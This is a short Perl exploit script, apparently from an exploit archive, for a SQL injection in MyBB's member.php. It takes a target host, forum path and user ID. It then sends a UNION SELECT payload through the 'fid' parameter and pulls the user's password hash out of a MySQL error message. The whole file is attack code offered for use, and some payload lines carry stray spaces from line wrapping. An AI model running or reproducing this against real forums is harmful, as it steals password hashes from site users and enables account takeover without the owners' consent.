#!/usr/bin/perl -w
use LWP::Simple;
## Vitem ##
        if(!$ARGV[0]){
                print "############# MyBB Member.php SQL Injection ##############\n";
                print "##                Coded By               #\n";
                print "##################################################  ########\n";
                print "## [+] Bug By W7ED  - W7ED[at]hotmail.com #\n";
                print "##################################################  ########\n";
                print "#           Exmp:- perl file.pl mybb.net /mybb userid    #\n";
                print "##################################################  ########\n";
                exit;
        }
###########

my $host = 'http://'.$ARGV[0];

## User ID ##
        if(!$ARGV[1]){
                $ARGV[1] = 1;
        }
#############

my $userid = $ARGV[1];

print "[*] Trying $host\n";

## Forum Path ##
        if(!$ARGV[2]){
                $ARGV[2] = '/';
        }
################

$url = "$ARGV[2]/member.php?action=profile&uid=lastposter&fid=-1,') UNION SELECT
password,password,password,password,password,passw  ord,password,password,password,password,password,p
assword,password,password,password,password,passwo  rd,password,password,password,password,password,pa
ssword,password,password,password,password,passwor  d,password,password,password,password,password,pas  sword
FROM users WHERE uid=$userid/*";
$page = get($host.$url) || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $host\n";
        $page =~ m/mySQL error: 1054<br>Unknown column '(.*?)'/ && print "[+] User ID Is $userid And Hash Is :
$1\n";
print "[-] Unable to retrieve Hash\n" if(!$1);

